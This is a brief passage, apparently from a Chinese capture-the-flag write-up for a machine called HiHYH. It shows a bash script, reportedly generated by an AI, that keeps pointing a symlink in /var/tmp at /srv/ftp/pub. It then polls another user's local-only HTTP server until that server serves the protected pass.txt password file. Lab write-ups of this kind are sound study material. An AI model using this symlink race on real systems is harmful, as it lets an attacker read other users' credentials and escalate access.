hyh用户每分钟启动一次http服务，目录是/var/tmp，每次存活30秒，而且仅本机可访问，联想到ftp服务下的pass.txt文件无法读取，让ai生成一个脚本进行读取

www-data@HiHYH:/tmp$ cat 1.sh
#!/bin/bash

# 后台持续创建软链接，确保 /var/tmp/hyh 指向 /srv/ftp/pub
(while true; do
    ln -snf /srv/ftp/pub /var/tmp/hyh 2>/dev/null
    sleep 0.1
done) &

L_PID=$!   # 保存后台进程 PID

echo "侦听中..."

# 主循环：不断尝试访问 HTTP 服务
while true; do
    res=$(python3 -c "
import urllib.request
try:
    r = urllib.request.urlopen('http://127.0.0.1:8080/hyh/pass.txt', timeout=0.5)
    print(r.read().decode())
except:
    pass
" 2>/dev/null)

    if [ -n "$res" ]; then
        echo -e "\n[!] 抓取成功！密码如下:\n$res"
        kill $L_PID
        break
    fi

    echo -n "."
    sleep 1
done
